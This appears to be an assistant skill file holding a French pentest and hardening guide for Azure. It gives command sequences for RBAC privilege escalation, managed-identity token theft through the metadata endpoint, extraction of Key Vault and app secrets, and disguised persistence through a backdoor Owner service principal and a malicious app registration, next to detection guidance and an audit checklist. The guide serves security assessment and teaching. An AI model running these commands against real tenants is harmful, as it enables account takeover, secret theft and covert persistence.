---
name: cloud-security-azure
description: Guide complet de sécurité Azure — pentest, hardening, énumération, IAM, Key Vault, App Services, Functions, Storage, RBAC, Defender, Log Analytics, et détection d'incidents
category: cybersecurite
---

# Cloud Security Azure — Guide Complet

---

## Prérequis

### Installation outils
```bash
# Azure CLI
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
az login
az account list
az account set --subscription <ID>

# PowerShell Az (via pwsh)
Install-Module -Name Az -Force

# Outils complémentaires
pip install azure-identity azure-mgmt-resource
pip install scoutsuite
pip install prowler
```

### Identités et Accès
```bash
# Vérifier l'identité courante
az account show
az ad signed-in-user show

# Lister les subscriptions
az account list --output table
az account management-group list

# Informations tenant
az ad tenant show
az rest --method get --url "https://management.azure.com/tenants?api-version=2020-01-01"
```

---

## 1. Énumération Azure

### Ressources
```bash
# Lister toutes les ressources
az resource list --output table

# Groups
az group list --output table
az group show --name <RG>

# Virtual Machines
az vm list --output table
az vm list --query "[].{Name:name, OS:storageProfile.osDisk.osType, State:powerState}" --output table

# Storage
az storage account list --output table
az storage account show --name <account>
az storage container list --account-name <account>
az storage blob list --container-name <container> --account-name <account>

# Networking
az network vnet list --output table
az network nsg list --output table
az network nsg rule list --nsg-name <NSG> --resource-group <RG>

# Databases
az sql server list --output table
az sql db list --server <server> --resource-group <RG>
az cosmosdb list --output table
az redis list --output table

# App Services
az webapp list --output table
az functionapp list --output table
az webapp config appsettings list --name <app> --resource-group <RG>

# Key Vault
az keyvault list --output table
az keyvault secret list --vault-name <vault>
az keyvault key list --vault-name <vault>

# Kubernetes (AKS)
az aks list --output table
az aks show --name <cluster> --resource-group <RG>
az aks get-credentials --name <cluster> --resource-group <RG>
```

### RBAC - Énumération des Permissions
```bash
# Rôles attribués
az role assignment list --all --output table
az role assignment list --assignee <user> --all

# Définitions de rôles personnalisés
az role definition list --custom-role-only true

# Qui peut faire quoi
az role assignment list --all --query "[].{Principal:principalName, Role:roleDefinitionName, Scope:scope}"

# Énumération PIM (Privileged Identity Management)
az rest --method get --url "https://management.azure.com/providers/Microsoft.Authorization/roleEligibilityScheduleInstances?api-version=2020-10-01"
```

### Managed Identities
```bash
# System-assigned MSI sur VM
az vm show --name <vm> --resource-group <RG> --query identity

# User-assigned MSI
az identity list --output table
az identity show --name <identity> --resource-group <RG>
```

---

## 2. Escalade de Privilèges Azure

### RBAC Chemins de Privesc

| Permission | Impact |
|------------|--------|
| `Microsoft.Authorization/roleAssignments/write` | Attribuer n'importe quel rôle |
| `Microsoft.Authorization/roleDefinitions/write` | Créer/modifier des rôles custom |
| `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action` | Attacher une MSI |
| `Microsoft.KeyVault/vaults/write` | Modifier les politiques d'accès |
| `Microsoft.Compute/virtualMachines/write` | Exécuter des commandes |
| `Microsoft.Authorization/locks/delete` | Supprimer les locks |

### Exploitation RBAC

```bash
# Créer un rôle custom admin
cat > custom-admin-role.json << 'EOF'
{
  "Name": "Custom Admin",
  "IsCustom": true,
  "Description": "Full access",
  "Actions": ["*"],
  "NotActions": [],
  "AssignableScopes": ["/subscriptions/<SUB-ID>"]
}
EOF
az role definition create --role-definition @custom-admin-role.json

# Attribuer un rôle à un utilisateur contrôlé
az role assignment create --assignee <user> --role "Owner" --subscription <SUB-ID>

# Supprimer un lock
az lock delete --name <lock> --resource-group <RG>
```

### Key Vault Exploitation
```bash
# Vérifier les politiques d'accès
az keyvault show --name <vault> --query properties.accessPolicies

# RBAC vs Access Policies
# Si RBAC: on peut s'attribuer l'accès
az role assignment create --assignee <user> --role "Key Vault Secrets User" --scope /subscriptions/.../vaults/<vault>

# Lister les secrets
az keyvault secret list --vault-name <vault>
az keyvault secret show --vault-name <vault> --name <secret>

# Récupérer les clés de chiffrement
az keyvault key list --vault-name <vault>
az keyvault key show --vault-name <vault> --name <key>
```

### Managed Identity Exploitation
```bash
# Si on a accès à une VM avec MSI
# Obtenir un token MSI depuis la VM
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"

# Utiliser le token pour explorer
export TOKEN=$(curl ...)
curl -H "Authorization: Bearer $TOKEN" https://management.azure.com/subscriptions?api-version=2020-01-01
```

### Automation Account / Runbook Exploitation
```bash
# Lister les automation accounts
az automation account list --output table

# Récupérer les runbooks
az automation runbook list --automation-account-name <aa> --resource-group <RG>

# Les variables d'automation contiennent souvent des secrets
az automation variable list --automation-account-name <aa> --resource-group <RG>
```

---

## 3. Azure Storage Exploitation

### Storage Account — Accès
```bash
# Blobs publics
curl https://<account>.blob.core.windows.net/<container>/?restype=container&comp=list
az storage blob list --account-name <account> --container-name <container> --auth-mode login

# Shared Access Signature (SAS) tokens
# Chercher des tokens SAS dans le code source, les logs, les variables d'env
# Format: ?sv=2018-03-28&ss=b&srt=sco&sp=rwdlac&se=...&sig=...
```

### Tables & Queues
```bash
# Enumération des tables
az storage table list --account-name <account>

# Files d'attente
az storage queue list --account-name <account>
az storage message peek --queue-name <queue> --account-name <account>
```

---

## 4. Azure Container Exploitation

### ACR (Azure Container Registry)
```bash
# Lister les registres
az acr list --output table

# Lister les images
az acr repository list --name <registry>
az acr repository show-tags --name <registry> --repository <image>

# Pull d'images
az acr login --name <registry>
docker pull <registry>.azurecr.io/<image>:<tag>
```

### AKS (Azure Kubernetes Service)
```bash
# Obtenir les credentials
az aks get-credentials --name <cluster> --resource-group <RG>

# Énumération
kubectl get nodes
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces

# Azure AD integration — vérifier l'auth
kubectl get clusterrolebinding -o yaml
```

---

## 5. Azure App Services Exploitation

### Web Apps
```bash
# Variables d'environnement (secrets)
az webapp config appsettings list --name <app> --resource-group <RG>

# Connection strings
az webapp config connection-string list --name <app> --resource-group <RG>

# Logs
az webapp log tail --name <app> --resource-group <RG>

# FTP credentials
az webapp deployment source show --name <app> --resource-group <RG>

# Run command (si accessible)
az webapp ssh --name <app> --resource-group <RG>
```

### Functions
```bash
# Variables d'env
az functionapp config appsettings list --name <app> --resource-group <RG>

# Function keys
az functionapp function keys list --name <app> --resource-group <RG> --function-name <func>

# Master key
az rest --method post --url "https://management.azure.com/subscriptions/.../resourceGroups/.../providers/Microsoft.Web/sites/<app>/functions/admin/masterkey?api-version=2019-08-01"
```

---

## 6. Azure Network Security

### NSG Analysis
```bash
# Règles NSG (Network Security Groups)
az network nsg rule list --nsg-name <NSG> --resource-group <RG> --query "[].{Name:name, Source:sourceAddressPrefix, Dest:destinationAddressPrefix, Port:destinationPortRange, Protocol:protocol, Access:access}"

# Trouver les règles 0.0.0.0/0
az network nsg rule list --nsg-name <NSG> --resource-group <RG> --query "[?sourceAddressPrefix=='*' || sourceAddressPrefix=='0.0.0.0/0' || sourceAddressPrefix=='Internet']"

# Application Security Groups
az network asg list --output table
```

### Azure Firewall / WAF
```bash
# Azure Firewall
az network firewall list --output table
az network firewall policy list --output table

# Application Gateway WAF
az network application-gateway waf-policy list --output table
az network application-gateway waf-policy show --name <policy> --resource-group <RG>
```

### Private Link / Service Endpoints
```bash
# Private endpoints
az network private-endpoint list --output table
az network private-link-service list --output table

# Service endpoints
az network vnet subnet list --resource-group <RG> --vnet-name <vnet> --query "[].{Name:name, ServiceEndpoints:serviceEndpoints}"
```

---

## 7. Détection et Défense Azure

### Microsoft Defender for Cloud
```bash
# Vérifier les plans Defender
az security pricing list --output table

# Secure Score
az security secure-score list --output table

# Alertes de sécurité
az security alert list --output table
az security alert show --name <alert>

# Recommendations
az security assessment list --output table
```

### Azure Policy
```bash
# Policy assignments
az policy assignment list --output table

# Policy definitions
az policy definition list --output table

# Initiatives
az policy set-definition list --output table
```

### Log Analytics / Sentinel
```bash
# Workspaces Log Analytics
az monitor log-analytics workspace list --output table

# Requêtes KQL courantes
# Identity Logons
# SigninLogs | where ResultType == 0
# Alertes Defender
# SecurityAlert | where TimeGenerated > ago(24h)
# Activité admin
# AuditLogs | where OperationName contains "Add member to role"
```

### Diagnostic Settings
```bash
# Vérifier les logs de diagnostic
az monitor diagnostic-settings list --resource <resource-id>

# Activer les logs manquants
az monitor diagnostic-settings create --name "audit-logs" --resource <resource-id> --logs '[{"category":"AuditEvent","enabled":true}]' --workspace <workspace-id>
```

---

## 8. Persistance Azure

### Service Principal Backdoor
```bash
# Créer un SP persistant
az ad sp create-for-rbac --name "backup-service" --role Owner --scopes /subscriptions/<SUB-ID>

# Récupérer les credentials
az ad sp credential list --id <app-id>

# Vérifier l'accès
az login --service-principal -u <app-id> -p <password> --tenant <tenant>
```

### Automation Account Persistence
```bash
# Runbook déclenché périodiquement
az automation schedule create --automation-account-name <aa> --resource-group <RG> --name "daily-check" --start-time "2025-01-01T00:00:00Z" --day-interval 1

# Lier le runbook au schedule
az automation runbook create --automation-account-name <aa> --resource-group <RG> --name "persistence" --type PowerShell --location <location>
```

### Azure AD App Registration
```bash
# Enregistrer une app malveillante
az ad app create --display-name "MonitoringService" --available-to-other-tenants false

# Ajouter des permissions élevées
az ad app permission add --id <app-id> --api 00000002-0000-0000-c000-000000000000 --api-permissions 1cda74f2-2616-4834-b122-5cb1b07f8a59=Role

# Consentement admin
az ad app permission admin-consent --id <app-id>
```

---

## 9. Audit Checklist

```
ÉNUMÉRATION
☐ Lister toutes les ressources et subscriptions
☐ Analyser les rôles RBAC (sur-permissifs ?)
☐ Vérifier les Managed Identities exposées
☐ Inspecter les variables d'env des App Services/Functions
☐ Découvrir les Key Vaults accessibles

STOCKAGE
☐ Blobs publics / conteneurs ouverts
☐ SAS tokens exposés (dans code, logs, git)
☐ Firewall Storage désactivé
☐ Versioning désactivé
☐ Soft delete désactivé

IDENTITÉ
☐ MFA désactivé sur des comptes privilégiés
☐ Legacy authentication activé
☐ Conditional Access policies absentes
☐ Guest users avec trop de droits
☐ Service Principals avec credentials expirés

RÉSEAU
☐ NSG avec 0.0.0.0/0 sur ports sensibles (22, 3389, 1433)
☐ Pas de NSG sur des sous-réseaux
☐ Azure Firewall désactivé
☐ WAF désactivé sur App Gateway
☐ Private Link non utilisé pour les ressources critiques

SÉCURITÉ
☐ Microsoft Defender for Cloud désactivé
☐ Secure Score bas
☐ Azure Policy non déployée
☐ Diagnostic Settings manquants
☐ Log Analytics / Sentinel non configurés
☐ AuditLogs non archivés
☐ Network Watcher désactivé

CONTAINERS
☐ ACR sans firewall / admin user activé
☐ AKS avec RBAC désactivé
☐ AKS Azure AD integration désactivée
☐ Container images non scannées

DÉTECTION
☐ Defender for Cloud alerts non configurées
☐ Azure Sentinel absent
☐ Anomaly detection désactivée
☐ Purview (data governance) non déployé
```

## Outils

| Outil | Description | Lien |
|-------|-------------|------|
| **ScoutSuite** | Audit multi-cloud (Azure) | https://github.com/nccgroup/ScoutSuite |
| **Prowler** | Security assessments | https://github.com/prowler-cloud/prowler |
| **MicroBurst** | Outils de pentest Azure | https://github.com/NetSPI/MicroBurst |
| **Stormspotter** | Visualisation Azure | https://github.com/Azure/Stormspotter |
| **PowerZure** | Framework pentest Azure | https://github.com/hausec/PowerZure |
| **AzureHound** | BloodHound pour Azure | https://github.com/BloodHoundAD/AzureHound |
| **ROADtools** | Azure AD tooling | https://github.com/dirkjanm/ROADtools |
| **Azurite** | Emulateur Azure local | https://github.com/Azure/Azurite |

## Ressources

- **HackTricks Azure**: https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html
- **Azure Security Documentation**: https://docs.microsoft.com/en-us/azure/security/
- **Microsoft Security Response Center**: https://msrc.microsoft.com/
- **Azure AD Attack & Defense**: https://github.com/Cloud-Architekt/AzureAD-Attack-Defense
- **Azure Pentesting Wiki**: https://github.com/rootsecdev/Azure-Red-Team
- **CIS Microsoft Azure Foundations Benchmark**: https://www.cisecurity.org/benchmark/azure